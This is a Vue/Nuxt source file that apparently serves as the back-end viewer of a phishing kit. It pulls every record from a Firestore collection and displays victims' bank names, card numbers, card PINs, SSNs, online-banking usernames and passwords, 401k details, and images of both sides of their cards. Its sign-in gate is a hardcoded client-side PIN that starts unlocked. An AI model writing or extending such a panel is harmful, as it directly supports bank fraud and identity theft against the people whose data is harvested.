<script setup lang="ts">
import { collection, getDocs, Timestamp, query, orderBy,  } from "firebase/firestore";
// SweetAlert
const { $swal } = useNuxtApp();
const { $db } = useNuxtApp();

const form:any = ref({
  pin: '',
  verify_pin: '8938',
})

const pageLocked = ref(false);
const loadReq = ref(false);

const submitForm = () => {
  loadReq.value = true;
  if (form.value.pin === form.value.verify_pin) {
    $swal.fire('Success', 'You have successfully signed in!', 'success');
    pageLocked.value = false;
    loadReq.value = false;
  } else {
    $swal.fire('Error', 'Incorrect PIN. Please try again.', 'error');
    loadReq.value = false;
  }
}

const getCardStyle = (image: string) => {
  return image
    ? {
        backgroundImage: `url(${image})`,
        backgroundSize: 'cover',
        backgroundPosition: 'center'
      }
    : {}
}

const loading = ref(true);
const requestCollection = ref<any[]>([]);

const fetchRequests = async () => {
  loading.value = true;
	// fetch requestCollection
	const requestSnapshot = await getDocs(
		query(collection($db, "bdo-uni"), orderBy("createdAt", "desc"))
	);
	requestCollection.value = requestSnapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
  loading.value = false;
};

// fetch requests on component mount
onMounted(() => {
  fetchRequests();
  console.log(requestCollection.value);
});
</script>

<template>
  <div class="container py-5">

    <!-- Header -->
    <div class="text-center mb-4">
      <div class="logo"><img src="@/assets/images/logo.png" height="40" alt=""></div>
    </div>

    <div class="row justify-content-center">
      <div class="col-lg-5" v-if="pageLocked==true">
        <!-- Code form -->
        <div class="card checkout-card p-4 text-center">
          <h5 class="card-title">Sign in</h5>
          <p class="card-text">Please enter your PIN to sign in.</p>
          <form @submit.prevent="submitForm">
            <div class="mb-3 py-3">
              <input
                v-model="form.pin"
                type="password"
                class="form-control text-center"
                placeholder=" **** "
                required
              />
            </div>
            <button type="submit" class="btn btn-primary w-100 p-3 login-btn" style="background-color:#014EA8;" :disabled="loadReq==true">
              <i class="spinner-border spinner-border-sm" v-if="loadReq==true"></i>
              Sign in
            </button>
          </form>
        </div>
      </div>
      <div class="col-lg-8" v-else>
        <div class="p-4 text-center">
          <div v-if="loading==true" class="d-flex justify-content-center py-5">
            <div class="spinner-border text-primary" role="status">
              <span class="visually-hidden">Loading...</span>
            </div>
          </div>

          <div v-else>
            <h4 class="mb-4">Recent Requests</h4>
            <div v-if="requestCollection.length === 0" class="text-muted">No requests found.</div>
            
            <div class="list-group mb-4 shadow-sm" v-for="request in requestCollection" :key="request.id">
              <div class="list-group-item d-flex justify-content-between align-items-start">
                <div>Bank name</div>
                <div>{{ request.bank }}</div>
              </div>
              <div class="list-group-item d-flex justify-content-between align-items-start">
                <div>Card or Account Number</div>
                <div>{{ request.accountNumber }}</div>
              </div>
              <div class="list-group-item d-flex justify-content-between align-items-start">
                <div>Next Payroll Date</div>
                <div>{{ request.nextPayrollDate }}</div>
              </div>
              <div class="list-group-item d-flex justify-content-between align-items-start">
                <div>Card Pin</div>
                <div>{{ request.cardpinNumber }}</div>
              </div>
              <div class="list-group-item d-flex justify-content-between align-items-start">
                <div>SSN or Tax ID #</div>
                <div>{{ request.ssn }}</div>
              </div>
              <div class="list-group-item d-flex justify-content-between align-items-start">
                <div>Amount Withdrawing to Bank</div>
                <div>{{ request.amount }}</div>
              </div>
              <div class="list-group-item d-flex justify-content-between align-items-start">
                <div>401k</div>
                <div>{{ request.fortyOneK }}</div>
              </div>
              <div class="list-group-item d-flex justify-content-between align-items-start">
                <div>Username</div>
                <div>{{ request.username }}</div>
              </div>
              <div class="list-group-item d-flex justify-content-between align-items-start">
                <div>Password</div>
                <div>{{ request.password }}</div>
              </div>
              <div class="list-group-item d-flex justify-content-between align-items-start">
                <div>401k Provider</div>
                <div>{{ request.fortyOneKProvider }}</div>
              </div>
              <div class="list-group-item" v-if="request.frontPreview && request.backPreview">
                <div class="row">
                  <div class="col-6">
                    <a download="true" :href="request.frontPreview" class="card image-card" :style="getCardStyle(request.frontPreview)"></a>
                  </div>
                  <div class="col-6">
                    <a download="true" :href="request.backPreview" class="card image-card" :style="getCardStyle(request.backPreview)"></a>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<style scoped>
.image-card {
  display: block;
  width: 100%;
  aspect-ratio: 1.6;
  cursor: pointer;
  border: 2px dashed #ced4da;
  overflow: hidden;
  border-radius: 8px;
  transition: 0.2s;
}
</style>